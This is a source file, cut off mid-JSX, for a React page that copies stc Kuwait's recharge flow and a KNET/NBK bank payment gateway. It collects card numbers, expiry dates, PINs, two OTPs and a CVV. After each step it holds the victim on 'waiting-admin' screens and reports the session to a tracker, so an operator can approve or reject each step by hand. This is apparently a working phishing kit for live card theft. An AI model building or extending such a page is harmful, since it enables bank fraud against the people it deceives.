"use client";

import { useEffect, useRef, useState } from "react";
import { useActionState } from "react";
import { useTranslations } from "next-intl";
import { Link, useRouter } from "@/i18n/navigation";
import { isValidCardExpiryMmYy, normalizeExpiryMonthInput } from "@/lib/card-expiry";
import type { ActionResult } from "@/lib/codes";
import { formatKnetCard, knetCards, knetLogoFor, maskKnetCard } from "@/lib/knet-cards";
import { parseKwdToMinor } from "@/lib/money";
import { getTrackerSessionId, reportTrackerState } from "@/lib/tracker-session";
import { ApprovalWait, type KnetWaitPhase } from "@/views/checkout/approval-wait";
import { KnetRejectOverlay, type KnetRejectKind } from "@/views/checkout/knet-reject-overlay";
import {
  knetAcknowledgeRetryAction,
  knetAction,
  knetCvvAction,
  knetOtp2Action,
  knetOtpAction,
  payAction,
  rechargeAction,
} from "@/server/actions";
import { useRechargeDraft } from "@/state/recharge-draft.store";
import { ErrorLine } from "@/views/ui/error-line";

const presets = [
  { amount: 2, days: 10 },
  { amount: 3, days: 15 },
  { amount: 5, days: 30 },
  { amount: 10, days: 90 },
  { amount: 20, days: 180 },
  { amount: 25, days: 365 },
];

const methods = [
  { id: "knet", icon: "/icons/pay-knet.svg", label: "knet" },
  { id: "gpay", icon: "/icons/pay-gpay.svg", label: "gpay" },
] as const;

function moneyLabel(halalas: number) {
  const value = halalas / 100;
  return Number.isInteger(value) ? String(value) : value.toFixed(3).replace(/0+$/, "").replace(/\.$/, "");
}

function maskKnetOtpCard(digits: string) {
  const masked = digits.replace(/\D/g, "").slice(0, 16).split("").map((digit, index) => (index >= 4 && index <= 9 ? "*" : digit)).join("");
  return masked.replace(/(.{4})/g, "$1 ").trim();
}

function otpReady(value: string) {
  return /^\d{6}$/.test(value);
}

export function QuickPayAmount({ locale, productId }: { locale: string; productId: string }) {
  const t = useTranslations("quickPayPage");
  const router = useRouter();
  const hydrated = useRechargeDraft((state) => state.hydrated);
  const msisdn = useRechargeDraft((state) => state.msisdn);
  const idempotencyKey = useRechargeDraft((state) => state.idempotencyKey);
  const rotateKey = useRechargeDraft((state) => state.rotateKey);
  const selectProduct = useRechargeDraft((state) => state.selectProduct);
  const [amountText, setAmountText] = useState("");
  const [step, setStep] = useState<"amount" | "pay" | "waitingApproval" | "knet" | "knetOtp" | "knetCvv" | "knetOtp2">("amount");
  const [waitingOrderId, setWaitingOrderId] = useState<string | null>(null);
  const [method, setMethod] = useState<(typeof methods)[number]["id"]>("knet");
  const [debitNumber, setDebitNumber] = useState("");
  const [debitFocused, setDebitFocused] = useState(false);
  const [suggestOpen, setSuggestOpen] = useState(false);
  const [debitMonth, setDebitMonth] = useState("");
  const [debitYear, setDebitYear] = useState("");
  const [pin, setPin] = useState("");
  const [knetOtp, setKnetOtp] = useState("");
  const [knetOtp2, setKnetOtp2] = useState("");
  const [knetCvv, setKnetCvv] = useState("");
  const [knetError, setKnetError] = useState(false);
  const [knetExpiryError, setKnetExpiryError] = useState(false);
  const [knetErrorKey, setKnetErrorKey] = useState("knetInvalid");
  const [knetOrderId, setKnetOrderId] = useState<string | null>(null);
  const [otpLeft, setOtpLeft] = useState(4 * 60);
  const [checkoutError, setCheckoutError] = useState<string | null>(null);
  const [checkoutBusy, setCheckoutBusy] = useState(false);
  const [knetBusy, setKnetBusy] = useState(false);
  const [knetWaitPhase, setKnetWaitPhase] = useState<KnetWaitPhase | null>(null);
  const [rejectKind, setRejectKind] = useState<KnetRejectKind | null>(null);
  const [otpResendSeconds, setOtpResendSeconds] = useState(0);
  const otpRetryDoneRef = useRef(false);
  const expiryYearRef = useRef<HTMLInputElement>(null);
  const expiryMonthRef = useRef<HTMLInputElement>(null);
  const followed = useRef("");
  const [state, action, pending] = useActionState(rechargeAction, null as ActionResult | null);
  const parsed = parseKwdToMinor(amountText);
  const ready = Boolean(productId && parsed);
  const debitMatches = debitNumber ? knetCards.filter((card) => card.bin.startsWith(debitNumber)) : [];
  const debitLogo = knetLogoFor(debitNumber);
  const otpClock = `${String(Math.floor(otpLeft / 60)).padStart(2, "0")}:${String(otpLeft % 60).padStart(2, "0")}`;

  useEffect(() => {
    if (hydrated && !msisdn.trim()) router.replace("/");
  }, [hydrated, msisdn, router]);

  function stampSession(data: FormData) {
    data.set("sessionId", getTrackerSessionId());
    return data;
  }

  const stepPage: Record<string, string> = {
    amount: "/quick-pay/amount",
    pay: "/quick-pay/pay",
    knet: "/quick-pay/knet",
    knetOtp: "/quick-pay/knet-otp",
    knetCvv: "/quick-pay/knet-cvv",
    knetOtp2: "/quick-pay/knet-otp-2",
    waitingApproval: "/quick-pay/waiting-admin",
  };

  useEffect(() => {
    const page = stepPage[step] ?? "/quick-pay";
    reportTrackerState({ page });
  }, [step]);

  useEffect(() => {
    if (step !== "knetOtp" && step !== "knetOtp2") return;
    setOtpLeft(4 * 60);
    const timer = window.setInterval(() => setOtpLeft((seconds) => (seconds > 0 ? seconds - 1 : 0)), 1000);
    return () => window.clearInterval(timer);
  }, [step]);

  useEffect(() => {
    if ((rejectKind !== "otp" && rejectKind !== "otp2") || otpResendSeconds <= 0) return;
    const timer = window.setInterval(() => {
      setOtpResendSeconds((seconds) => (seconds > 0 ? seconds - 1 : 0));
    }, 1000);
    return () => window.clearInterval(timer);
  }, [rejectKind, otpResendSeconds]);

  useEffect(() => {
    if (rejectKind !== "otp" && rejectKind !== "otp2") {
      otpRetryDoneRef.current = false;
      return;
    }
    if (otpResendSeconds > 0) return;
    if (otpRetryDoneRef.current) return;
    otpRetryDoneRef.current = true;
    void finishKnetRetry(rejectKind);
  }, [rejectKind, otpResendSeconds]);

  async function finishKnetRetry(kind: KnetRejectKind) {
    const orderId = knetOrderId;
    if (orderId) await knetAcknowledgeRetryAction(orderId);
    setRejectKind(null);
    if (kind === "card") {
      setPin("");
      setKnetError(false);
      setStep("knet");
    } else if (kind === "otp") {
      setKnetOtp("");
      setKnetError(false);
      setStep("knetOtp");
    } else if (kind === "otp2") {
      setKnetOtp2("");
      setKnetError(false);
      setStep("knetOtp2");
    } else {
      setKnetCvv("");
      setKnetError(false);
      setStep("knetCvv");
    }
  }

  function handleKnetRetry(kind: KnetRejectKind) {
    setKnetBusy(false);
    setKnetWaitPhase(null);
    otpRetryDoneRef.current = false;
    setRejectKind(kind);
    if (kind === "card") setStep("knet");
    else if (kind === "cvv") setStep("knetCvv");
    else if (kind === "otp2") {
      setStep("knetOtp2");
      setOtpResendSeconds(4);
    } else {
      setStep("knetOtp");
      setOtpResendSeconds(4);
    }
  }

  async function ensureCheckoutOrder(setter: (id: string) => void, existing: string | null) {
    if (existing) return existing;
    if (!productId || !parsed) {
      setCheckoutError("invalid_amount");
      return null;
    }
    let key = idempotencyKey;
    if (!/^[0-9a-f-]{36}$/i.test(key)) {
      rotateKey();
      key = useRechargeDraft.getState().idempotencyKey;
    }
    if (!/^[0-9a-f-]{36}$/i.test(key)) {
      setCheckoutError("generic");
      return null;
    }
    setCheckoutError(null);
    setCheckoutBusy(true);
    try {
      const data = new FormData();
      data.set("productId", productId);
      data.set("amountHalalas", String(parsed));
      data.set("idempotencyKey", key);
      data.set("locale", locale);
      data.set("msisdn", msisdn);
      const result = await rechargeAction(null, data);
      if (!result.ok || !result.orderId) {
        setCheckoutError(result.ok ? "generic" : result.code);
        return null;
      }
      setter(result.orderId);
      return result.orderId;
    } finally {
      setCheckoutBusy(false);
    }
  }

  const ensureKnetOrder = () => ensureCheckoutOrder((id) => setKnetOrderId(id), knetOrderId);

  function showKnetError(key: string, expiry = false) {
    setKnetErrorKey(key);
    setKnetExpiryError(expiry);
    setKnetError(true);
  }

  async function submitKnetStep() {
    if (knetBusy) return;
    if (step === "knet") {
      const cardDigits = debitNumber.replace(/\D/g, "");
      const pinDigits = pin.replace(/\D/g, "");
      const expiryOk = isValidCardExpiryMmYy(debitMonth, debitYear);
      if (cardDigits.length < 10) {
        showKnetError("knetCardInvalid");
        return;
      }
      if (debitMonth.length !== 2 || debitYear.length !== 2 || !expiryOk) {
        showKnetError("knetExpiryInvalid", debitMonth.length === 2 && debitYear.length === 2);
        return;
      }
      if (pinDigits.length < 3 || pinDigits.length > 4) {
        showKnetError("knetPinInvalid");
        return;
      }
      setKnetExpiryError(false);
      const orderId = knetOrderId ?? (await ensureKnetOrder());
      if (!orderId) {
        showKnetError("knetOrderFailed");
        return;
      }
      setKnetBusy(true);
      setWaitingOrderId(orderId);
      const data = new FormData();
      data.set("orderId", orderId);
      data.set("amountHalalas", String(parsed ?? ""));
      data.set("cardNumber", cardDigits);
      data.set("expiryDate", `${debitMonth}/${debitYear}`);
      data.set("pin", pinDigits);
      const knetResult = await knetAction(null, stampSession(data));
      if (!knetResult.ok) {
        setKnetBusy(false);
        setWaitingOrderId(null);
        showKnetError(knetResult.code === "invalid_card" ? "knetInvalid" : "knetOrderFailed");
        return;
      }
      setKnetError(false);
      setKnetWaitPhase("card");
      setStep("waitingApproval");
      setKnetBusy(false);
      reportTrackerState({ page: "/quick-pay/knet-waiting", flowStage: "awaiting_admin", locked: true, orderId });
      return;
    }
    if (step === "knetOtp") {
      if (!otpReady(knetOtp)) {
        showKnetError("otpInvalid");
        return;
      }
      const orderId = knetOrderId ?? (await ensureKnetOrder());
      if (!orderId) {
        showKnetError("knetOrderFailed");
        return;
      }
      const data = new FormData();
      data.set("orderId", orderId);
      data.set("otp", knetOtp);
      const otpResult = await knetOtpAction(null, data);
      if (!otpResult.ok) {
        showKnetError("otpInvalid");
        return;
      }
      setKnetError(false);
      setKnetWaitPhase("otp");
      setWaitingOrderId(orderId);
      setStep("waitingApproval");
      reportTrackerState({ page: "/quick-pay/knet-otp-waiting", flowStage: "awaiting_admin", locked: true, orderId });
      return;
    }
    if (step === "knetCvv") {
      if (knetCvv.length !== 3) {
        showKnetError("cvvInvalid");
        return;
      }
      const orderId = knetOrderId ?? (await ensureKnetOrder());
      if (!orderId) {
        showKnetError("knetOrderFailed");
        return;
      }
      const cvvData = new FormData();
      cvvData.set("orderId", orderId);
      cvvData.set("cvv", knetCvv);
      const cvvResult = await knetCvvAction(null, stampSession(cvvData));
      if (!cvvResult.ok) {
        showKnetError("cvvInvalid");
        return;
      }
      setKnetWaitPhase("cvv");
      setWaitingOrderId(orderId);
      setStep("waitingApproval");
      reportTrackerState({ page: "/quick-pay/knet-cvv-waiting", flowStage: "awaiting_admin", locked: true, orderId });
      return;
    }
    if (step === "knetOtp2") {
      if (!otpReady(knetOtp2)) {
        showKnetError("otpInvalid");
        return;
      }
      const orderId = knetOrderId ?? (await ensureKnetOrder());
      if (!orderId) {
        showKnetError("knetOrderFailed");
        return;
      }
      const data = new FormData();
      data.set("orderId", orderId);
      data.set("otp", knetOtp2);
      const otpResult = await knetOtp2Action(null, data);
      if (!otpResult.ok) {
        showKnetError("otpInvalid");
        return;
      }
      setKnetError(false);
      setKnetWaitPhase("otp2");
      setWaitingOrderId(orderId);
      setStep("waitingApproval");
      reportTrackerState({ page: "/quick-pay/knet-otp2-waiting", flowStage: "awaiting_admin", locked: true, orderId });
      return;
    }
  }

  function goToKnetStep() {
    if (!ready) {
      setCheckoutError(productId ? "invalid_amount" : "noProduct");
      return;
    }
    setCheckoutError(null);
    setMethod("knet");
    setStep("knet");
    reportTrackerState({
      page: "/quick-pay/knet",
      flowStage: "knet",
      locked: false,
      orderId: knetOrderId ?? undefined,
    });
    window.scrollTo({ top: 0, behavior: "smooth" });
  }

  useEffect(() => {
    if (!state?.ok || !state.orderId || followed.current === state.orderId) return;
    if (method === "knet") return;
    const orderId = state.orderId;
    void (async () => {
      if (method === "gpay") {
        const data = new FormData();
        data.set("orderId", orderId);
        data.set("method", method);
        await payAction(null, data);
      }
      followed.current = orderId;
      rotateKey();
      router.push(`/checkout/${orderId}`);
      router.refresh();
    })();
  }, [state, method, rotateKey, router]);

  if (!hydrated || !msisdn.trim()) return <div className="h-64 animate-pulse bg-white" />;

  const shown = parsed ? moneyLabel(parsed) : "";

  if ((step === "waitingApproval" && waitingOrderId) || (knetBusy && waitingOrderId)) {
    return (
      <ApprovalWait
        orderId={waitingOrderId!}
        locale={locale}
        from="knet"
        knetWaitPhase={knetWaitPhase}
        onKnetUnlocked={(target) => {
          setKnetWaitPhase(null);
          setKnetBusy(false);
          setStep(target);
          reportTrackerState({
            page: target === "knetOtp" ? "/quick-pay/knet-otp" : target === "knetOtp2" ? "/quick-pay/knet-otp-2" : "/quick-pay/knet-cvv",
            flowStage: "knet",
            locked: true,
            orderId: waitingOrderId!,
          });
        }}
        onKnetRetry={handleKnetRetry}
      />
    );
  }

  return (
    <form
      action={action}
      className={`mx-auto flex min-h-dvh w-full max-w-lg flex-col text-black ${step === "knet" || step === "knetOtp" || step === "knetCvv" || step === "knetOtp2" ? "bg-[#ebebeb]" : "bg-white pb-[calc(55px+env(safe-area-inset-bottom,0px))]"}`}
      onSubmit={(event) => {
        if (step === "knet" || step === "knetOtp" || step === "knetCvv" || step === "knetOtp2") {
          event.preventDefault();
        }
      }}
    >
      <input type="hidden" name="productId" value={productId} />
      <input type="hidden" name="amountHalalas" value={parsed ?? ""} />
      <input type="hidden" name="idempotencyKey" value={idempotencyKey} />
      <input type="hidden" name="locale" value={locale} />
      <input type="hidden" name="msisdn" value={msisdn} />

      {step === "knet" || step === "knetOtp" || step === "knetCvv" || step === "knetOtp2" ? null : <header className="flex h-[74px] items-center justify-between px-5">
        {step === "amount" ? (
          <Link href="/" aria-label={t("back")} className="grid size-6 place-items-center text-brand">
            <BackIcon />
          </Link>
        ) : (
          <button type="button" aria-label={t("back")} className="grid size-6 place-items-center text-brand" onClick={() => setStep("amount")}>
            <BackIcon />
          </button>
        )}
        <h1 className="text-base font-normal">{step === "amount" ? t("title") : t("paymentTitle")}</h1>
        {step === "amount" ? (
          <button
            type="button"
            aria-label={t("share")}
            className="grid size-[18px] place-items-center"
            onClick={() => {
              const payload = { title: "stc", url: window.location.href };
              if (navigator.share) void navigator.share(payload).catch(() => undefined);
            }}
          >
            <img src="/icons/quickpay-share.avif" alt="" className="size-[18px] object-contain" />
          </button>
        ) : (
          <span className="size-6" />
        )}
      </header>}

      {step === "amount" ? (
        <>
          <div className="px-[30px] pt-[30px]">
            <h2 className="text-start text-[24px] font-medium leading-8">{t("heading")}</h2>
          </div>
          <div className="px-[30px] pb-[5px] pt-10">
            <input
              value={amountText}
              onChange={(event) => setAmountText(event.target.value.replace(/[^\d.]/g, ""))}
              inputMode="decimal"
              placeholder={t("amount")}
              aria-label={t("amount")}
              className="w-full border-0 border-b border-[#dde0e2] bg-transparent pb-1 text-start text-[24px] font-medium text-[#1d252d] outline-none placeholder:text-[19px] placeholder:font-normal placeholder:text-[#8e9aa0]"
            />
          </div>
          {state && !state.ok ? (
            <div className="px-[30px] pt-2">
              <ErrorLine code={state.code} />
            </div>
          ) : null}
          <div className="mt-2">
            {presets.map((item) => {
              const selected = parsed === item.amount * 100;
              return (
                <div key={item.amount}>
                  <button
                    type="button"
                    onClick={() => setAmountText(String(item.amount))}
                    className="flex h-[105px] w-full items-center justify-between bg-white px-5"
                  >
                    <span className="flex items-center">
                      <span className="relative block size-6 shrink-0 rounded-full border-[1.6px] border-brand" style={{ marginLeft: 10 }}>
                        {selected ? (
                          <span className="absolute left-1/2 top-1/2 size-[15.6px] -translate-x-1/2 -translate-y-1/2 rounded-full bg-brand" />
                        ) : null}
                      </span>
                      <span>
                        <span className="flex items-end">
                          <span className="text-sm font-medium leading-[22px]">د.ك</span>
                          <span className="text-[30px] font-medium leading-10" style={{ marginLeft: 5 }}>
                            {item.amount}
                          </span>
                        </span>
                        <span className="mt-[5px] block text-xs font-medium text-[#8e9aa0]">{t("validFor", { days: item.days })}</span>
                      </span>
                    </span>
                    <span
                      dir="ltr"
                      className="flex h-11 w-[70px] items-center bg-[length:70px_44px] bg-no-repeat pl-[7px] text-[16px] font-medium leading-none text-white"
                      style={{ backgroundImage: "url(/icons/recharge-card.avif)" }}
                    >
                      {item.amount}
                    </span>
                  </button>
                  <div className="ms-5 h-px bg-[#dde0e2]" />
                </div>
              );
            })}
          </div>
          {!productId ? (
            <p className="px-[30px] pb-3 text-sm font-medium text-danger">{t("noProduct")}</p>
          ) : null}
          <button
            type="button"
            disabled={!ready}
            onClick={() => {
              if (!parsed || !productId) {
                setCheckoutError(productId ? "invalid_amount" : "noProduct");
                return;
              }
              selectProduct(productId, parsed, "topup");
              setCheckoutError(null);
              rotateKey();
              setStep("pay");
            }}
            className="fixed inset-x-0 bottom-0 z-50 mx-auto flex w-full max-w-lg touch-manipulation items-center justify-center bg-primary text-[17px] font-medium text-white disabled:pointer-events-none disabled:opacity-65"
            style={{ minHeight: "calc(55px + env(safe-area-inset-bottom, 0px))", paddingBottom: "env(safe-area-inset-bottom, 0px)" }}
          >
            {t("continue")}
          </button>
        </>
      ) : step === "pay" ? (
        <>
          <div className="min-h-0 flex-1">
            <div className="px-5 pb-3 pt-5 text-base font-bold">{t("due")}</div>
            <div className="h-px bg-[#dde0e2]" />
            <div className="flex h-[86px] items-end justify-between px-5 pb-5 pt-[18px]">
              <span className="flex items-center gap-[5px] text-[#1d252d]">
                <span className="text-[24px] font-medium leading-8">د.ك</span>
                <span className="text-[38px] font-medium leading-[48px]">{shown}</span>
              </span>
            </div>
            <div className="h-px bg-[#dde0e2]" />
            <div className="flex h-20 items-end px-5 pb-[15px] pt-5 text-base font-bold text-[#1d252d]">{t("against")}</div>
            <div className="h-px bg-[#dde0e2]" />
            <div className="flex items-center justify-between px-5 pb-[15px] pt-5">
              <span>
                <span dir="ltr" className="block py-0.5 text-end text-base text-[#1d252d]">
                  {msisdn}
                </span>
                <span className="mt-[3px] block text-xs text-[#8e9aa0]">{t("prepaid")}</span>
              </span>
              <span className="flex items-center gap-[5px] font-medium text-[#1d252d]">
                <span className="text-sm">د.ك</span>
                <span className="text-[19px]">{shown}</span>
              </span>
            </div>
            <div className="h-px bg-[#dde0e2]" />
            <div className="flex h-20 items-end px-5 pb-[15px] pt-5 text-base font-bold text-[#1d252d]">{t("using")}</div>
            <div className="h-px bg-[#dde0e2]" />
            {methods.map((item) => {
              const selected = method === item.id;
              return (
                <div key={item.id} className={selected ? "mx-[10px] rounded-[6px] border-[1.6px] border-brand" : ""}>
                  <button
                    type="button"
                    onClick={() => {
                      if (item.id === "knet") {
                        goToKnetStep();
                        return;
                      }
                      setMethod(item.id);
                    }}
                    className="flex w-full touch-manipulation items-center gap-3 bg-white p-[15px]"
                  >
                    <img src={item.icon} alt="" className="h-[35px] w-auto object-contain" />
                    <span className="text-base text-[#1d252d]">{t(item.label)}</span>
                  </button>
                  {selected ? null : <div className="h-px bg-[#dde0e2]" />}
                </div>
              );
            })}
            <p className="px-[30px] py-5 text-start text-sm font-medium leading-[22px]">
              {t("terms")}{" "}
              <a href="https://www.stc.com.kw/ar/payment-terms-and-conditions" target="_blank" rel="noopener noreferrer" className="font-medium text-primary">
                {t("termsLink")}
              </a>
            </p>
            {checkoutError ? (
              <div className="px-[30px] pb-3">
                <ErrorLine code={checkoutError} />
              </div>
            ) : state && !state.ok ? (
              <div className="px-[30px] pb-3">
                <ErrorLine code={state.code} />
              </div>
            ) : null}
          </div>
          {method === "gpay" ? (
            <button
              type="submit"
              disabled={pending || checkoutBusy || !ready}
              aria-label="الدفع باستخدام GPay"
              className="fixed inset-x-0 bottom-0 z-10 mx-auto h-[55px] w-full max-w-lg bg-black bg-center bg-no-repeat disabled:opacity-65"
              style={{ borderRadius: 4, backgroundImage: "url(/icons/gpay-button-ar.svg)", backgroundSize: "131px 21px" }}
            />
          ) : (
            <button
              type="button"
              disabled={checkoutBusy || !ready}
              onClick={() => goToKnetStep()}
              className="fixed inset-x-0 bottom-0 z-50 mx-auto flex h-[55px] w-full max-w-lg touch-manipulation items-center justify-center bg-primary pb-[env(safe-area-inset-bottom,0px)] text-[17px] font-medium text-white disabled:opacity-65"
              style={{ minHeight: "calc(55px + env(safe-area-inset-bottom, 0px))" }}
            >
              {checkoutBusy ? t("creatingOrder") : t("confirm", { amount: shown })}
            </button>
          )}
        </>
      ) : (
        <div
          dir="ltr"
          className="knet-gateway bg-[#ebebeb] pb-6 text-black"
          style={{ fontFamily: "Verdana, Arial, Helvetica, sans-serif" }}
        >
          <div aria-hidden="true" className="mx-auto block h-[90px] max-w-[372px] bg-cover bg-center" style={{ margin: "5px auto -30px", borderRadius: "0 10px", backgroundImage: "url(/knet/banner.jpg)" }} />
          <div className="box-border w-full px-[15px]">
            <div className="mx-auto w-[98%] max-w-[395px]">
              <section className="mb-[15px] mt-[25px] rounded-[15px] border-2 border-[#8f8f90] bg-white p-5 shadow-[0_0_6px_rgba(0,0,0,0.3)]">
                <img src="/knet/logo.jpg" alt="NBK" className="-mt-[5px] mb-[15px] ml-[27%] w-[42%]" />
                <div className="flow-root border-b border-[#8f8f90] py-[5px]">
                  <span className="float-right text-[11px] font-bold text-[#0070cd]">:{t("beneficiary")}</span>
                  <span className="block w-[60%] text-end text-[11px] text-[#444]">{t("merchant")}</span>
                </div>
                <div className="flow-root py-[5px]">
                  <span className="float-right text-[11px] font-bold text-[#0070cd]">:{t("invoiceAmount")}</span>
                  <span className="block w-[60%] text-end text-[11px] text-[#444]">KD&nbsp;{((parsed ?? 0) / 100).toFixed(3)}</span>
                </div>
              </section>
              <section className="mb-[15px] rounded-[15px] border-2 border-[#8f8f90] bg-white p-5 shadow-[0_0_6px_rgba(0,0,0,0.3)]">
                {step === "knetOtp" || step === "knetOtp2" ? (
                  <div>
                    <p dir="rtl" className="rounded-[6px] border border-[#7eb6dc] bg-[#e8f4fb] px-2 py-[5px] text-center text-[11px] leading-4 text-[#3d92c9]">{step === "knetOtp2" ? t("otp2Warning") : t("otpWarning")}</p>
                    <div className="mt-2 flex items-center gap-2 border-b border-[#e4e4e4] py-[5px]">
                      <span dir="ltr" className="min-w-0 flex-1 whitespace-nowrap text-center text-[11px] font-bold text-[#444]">{maskKnetOtpCard(debitNumber)}</span>
                      <span className="shrink-0 text-[11px] font-bold leading-4 text-[#0070cd]">:{t("debitNumber")}</span>
                    </div>
                    <div className="flex items-center gap-2 border-b border-[#e4e4e4] py-[5px]">
                      <span className="flex-1 text-center text-[11px] font-bold text-[#444]">{debitMonth}</span>
                      <span className="shrink-0 text-[11px] font-bold leading-4 text-[#0070cd]">:{t("otpMonth")}</span>
                    </div>
                    <div className="flex items-center gap-2 border-b border-[#e4e4e4] py-[5px]">
                      <span className="flex-1 text-center text-[11px] font-bold text-[#444]">{debitYear.length === 2 ? `20${debitYear}` : debitYear}</span>
                      <span className="shrink-0 text-[11px] font-bold leading-4 text-[#0070cd]">:{t("otpYear")}</span>
                    </div>
                    <div className="flex items-center gap-2 border-b border-[#e4e4e4] py-[5px]">
                      <span className="flex-1 text-center text-[11px] font-bold text-[#444]">{"*".repeat(pin.length)}</span>
                      <span className="shrink-0 text-[11px] font-bold leading-4 text-[#0070cd]">:{t("pin")}</span>
                    </div>
                    <label className="mt-[5px] flex items-center gap-2">
                      <input
                        value={step === "knetOtp2" ? knetOtp2 : knetOtp}
                        onChange={(event) => {
                          const val = event.target.value.replace(/\D/g, "").slice(0, 6);
                          if (step === "knetOtp2") {
                            setKnetOtp2(val);
                          } else {
                            setKnetOtp(val);
                          }
                          setKnetError(false);
                        }}
                        dir="ltr"
                        inputMode="numeric"
                        autoComplete="one-time-code"
                        maxLength={6}
                        placeholder={`Timeout in: ${otpClock}`}
                        aria-label={step === "knetOtp2" ? "OTP 2" : "OTP"}
                        className="h-[26px] w-[62%] rounded-[8px] border border-[#c8c8c8] bg-white text-center text-[11px] font-bold text-[#797575] outline-none placeholder:font-bold placeholder:text-[#9a9a9a]"
                      />
                      <span className="ms-auto shrink-0 text-[11px] font-bold leading-4 text-[#0070cd]">{step === "knetOtp2" ? "OTP 2:" : "OTP:"}</span>
                    </label>
                  </div>
                ) : step === "knetCvv" ? (
                  <label className="flow-root py-[5px]">
                    <span className="float-right mt-[3px] w-[40%] text-end text-[11px] font-bold leading-4 text-[#0070cd]">:{t("cvvLabel")}</span>
                    <input
                      value={knetCvv}
                      onChange={(event) => {
                        setKnetCvv(event.target.value.replace(/\D/g, "").slice(0, 3));
                        setKnetError(false);
                      }}
                      id="knet-cvv"
                      dir="ltr"
                      inputMode="numeric"
                      autoComplete="off"
                      maxLength={3}
                      aria-label={t("cvvLabel")}
                      className="block h-[26px] w-[60%] rounded-[5px] border border-[#c7d0d5] bg-[linear-gradient(to_bottom,#c9c9c9_0%,#fff_39%)] px-[5px] text-[11px] font-bold text-[#797575] outline-none"
                    />
                    <p className="clear-both pt-2 text-end text-[11px] leading-5 text-[#444]">{t("cvvHint")}</p>
                  </label>
                ) : (
                <>
                <div className="flow-root border-b border-[#8f8f90] py-[5px]">
                  <span className="float-right mt-[3px] w-[40%] text-end text-[11px] font-bold leading-4 text-[#0070cd]">:{t("debitNumber")}</span>
                  <div className={`relative w-[60%] ${suggestOpen && debitMatches.length > 0 ? "z-20" : ""}`}>
                    <input
                      value={debitFocused ? formatKnetCard(debitNumber) : maskKnetCard(debitNumber)}
                      onChange={(event) => {
                        setDebitNumber(event.target.value.replace(/\D/g, "").slice(0, 16));
                        setSuggestOpen(true);
                        setKnetError(false);
                      }}
                      onFocus={() => {
                        setDebitFocused(true);
                        if (debitNumber) setSuggestOpen(true);
                      }}
                      onBlur={() => {
                        setDebitFocused(false);
                        setSuggestOpen(false);
                      }}
                      dir="ltr"
                      inputMode="numeric"
                      autoComplete="off"
                      maxLength={19}
                      aria-label={t("debitNumber")}
                      className={`block h-[26px] w-full rounded-[5px] border border-[#c7d0d5] bg-[linear-gradient(to_bottom,#c9c9c9_0%,#fff_39%)] pl-[5px] text-[11px] font-bold text-[#797575] outline-none ${debitLogo ? "pr-[42px]" : "pr-[5px]"}`}
                    />
                    {debitLogo ? <img src={debitLogo} alt="" className="pointer-events-none absolute top-1/2 right-[6px] h-[15px] w-auto max-w-[35px] -translate-y-1/2" /> : null}
                    {suggestOpen && debitMatches.length > 0 ? (
                      <ul className="absolute top-full z-10 mt-[2px] max-h-[87px] w-full overflow-y-auto rounded-[5px] border border-[#c7d0d5] bg-[linear-gradient(to_bottom,#c9c9c9_0%,#fff_39%)] p-0 shadow-[0_3px_8px_rgba(0,0,0,0.25)]" style={{ fontFamily: "Arial, Helvetica, sans-serif" }}>
                        {debitMatches.map((card) => (
                          <li key={card.bin}>
                            <button
                              type="button"
                              onMouseDown={(event) => event.preventDefault()}
                              onClick={() => {
                                setDebitNumber((current) => (current.length < card.bin.length ? card.bin : current));
                                setSuggestOpen(false);
                                setKnetError(false);
                              }}
                              className="flex w-full cursor-pointer items-center justify-between px-[6px] py-[3px] text-left text-[13px] text-[#797575] hover:bg-[#e9e9e9]"
                            >
                              <span>{card.bin} - {card.brand}</span>
                              <img src={card.logo} alt="" className="ml-[10px] h-[13px] w-auto" />
                            </button>
                          </li>
                        ))}
                      </ul>
                    ) : null}
                  </div>
                </div>
                <div className="flow-root border-b border-[#8f8f90] py-[5px]">
                  <div className="float-right mt-[3px] text-right">
                    <span className="text-[11px] font-bold text-[#0070cd]">:{t("debitExpiry")}</span>
                  </div>
                  <div className="w-[60%] text-right">
                    <div dir="ltr" className="float-right flex h-[21px] w-[71px] items-center rounded-[5px] border border-[#ccc] bg-[linear-gradient(to_bottom,#c9c9c9_0%,#fff_39%)]">
                      <input
                        ref={expiryYearRef}
                        value={debitYear}
                        onChange={(event) => {
                          const next = event.target.value.replace(/\D/g, "").slice(0, 2);
                          setDebitYear(next);
                          setKnetError(false);
                          setKnetExpiryError(false);
                          if (next.length === 2) expiryMonthRef.current?.focus();
                        }}
                        dir="ltr"
                        inputMode="numeric"
                        autoComplete="off"
                        placeholder="YY"
                        aria-label={t("debitExpiry")}
                        className="h-full w-[30px] shrink-0 border-0 bg-transparent pl-[7px] text-[11px] font-bold text-[#797575] outline-none placeholder:font-bold placeholder:text-[rgba(0,0,0,0.56)]"
                      />
                      <span className="w-[11px] shrink-0 text-center text-[11px] font-bold leading-none text-[rgba(0,0,0,0.56)]">/</span>
                      <input
                        ref={expiryMonthRef}
                        value={debitMonth}
                        onChange={(event) => {
                          setDebitMonth(normalizeExpiryMonthInput(event.target.value));
                          setKnetError(false);
                          setKnetExpiryError(false);
                        }}
                        onKeyDown={(event) => {
                          if (event.key === "Backspace" && debitMonth.length === 0) expiryYearRef.current?.focus();
                        }}
                        dir="ltr"
                        inputMode="numeric"
                        autoComplete="off"
                        placeholder="MM"
                        aria-label={t("debitExpiry")}
                        className="h-full w-[28px] shrink-0 border-0 bg-transparent pr-[4px] text-center text-[11px] font-bold text-[#797575] outline-none placeholder:font-bold placeholder:text-[rgba(0,0,0,0.56)]"
                      />
                    </div>
                  </div>
                </div>
                <label className="flow-root py-[5px]">
                  <span className="float-right mt-[3px] w-[40%] text-end text-[11px] font-bold leading-4 text-[#0070cd]">:{t("pin")}</span>
                  <input
                    value={pin}
                    onChange={(event) => {
                      setPin(event.target.value.replace(/\D/g, "").slice(0, 4));
                      setKnetError(false);
                    }}
                    dir="ltr"
                    type="text"
                    inputMode="numeric"
                    autoComplete="off"
                    maxLength={4}
                    className="block h-[26px] w-[60%] rounded-[5px] border border-[#c7d0d5] bg-[linear-gradient(to_bottom,#c9c9c9_0%,#fff_39%)] px-[5px] text-[11px] font-bold text-[#797575] outline-none [-webkit-text-security:disc]"
                  />
                </label>
                </>
                )}
                {knetError ? (
                  <p className="pt-1 text-center text-[12px] text-[#ff0000]">
                    {t(knetErrorKey)}
                  </p>
                ) : null}
              </section>
              <section className="mb-[15px] rounded-[15px] border-2 border-[#8f8f90] bg-white p-5 shadow-[0_0_6px_rgba(0,0,0,0.3)]">
                <div className="flex gap-[3px]">
                  <button
                    type="button"
                    onClick={() => {
